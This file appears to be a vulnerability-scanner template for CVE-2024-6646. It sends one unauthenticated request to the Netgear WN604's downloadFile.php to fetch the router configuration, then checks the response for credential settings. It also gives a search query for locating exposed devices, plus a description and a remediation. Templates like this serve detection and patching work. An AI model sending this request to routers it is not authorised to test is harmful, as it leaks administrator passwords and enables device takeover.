http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - system:basicSettings
    - system:staSettings
  - part: content_type
    type: word
    words:
    - application/force-download
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/downloadFile.php?file=config'
id: CVE-2024-6646
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:h:netgear:wn604:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-6646
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-200
    epss-percentile: 0.99657
    epss-score: 0.91637
  description: 'There is an information leakage vulnerability in the downloadFile.php
    interface of Netgear WN604. A remote attacker using file authentication can use
    this vulnerability to obtain the administrator account and password information
    of the wireless router, causing the router''s background to be controlled. The
    attacker can initiate damage to the wireless network or further threaten it.

    '
  impact: 'Unauthenticated attackers can download configuration files containing administrator
    account and password information, enabling complete router compromise.

    '
  metadata:
    fofa-query: title=="Netgear"
    product: wn604
    vendor: netgear
  name: Netgear-WN604 downloadFile.php - Information Disclosure
  reference:
  - https://github.com/wy876/POC/blob/main/Ncast%E9%AB%98%E6%B8%85%E6%99%BA%E8%83%BD%E5%BD%95%E6%92%AD%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  - https://github.com/mikutool/vul/issues/1
  - https://vuldb.com/?ctiid.271052
  - https://vuldb.com/?id.271052
  - https://vuldb.com/?submit.367382
  remediation: 'Update Netgear WN604 to the latest firmware version that addresses
    the information disclosure vulnerability in downloadFile.php.

    '
  severity: medium
  tags: cve,cve2024,netgear,vuln
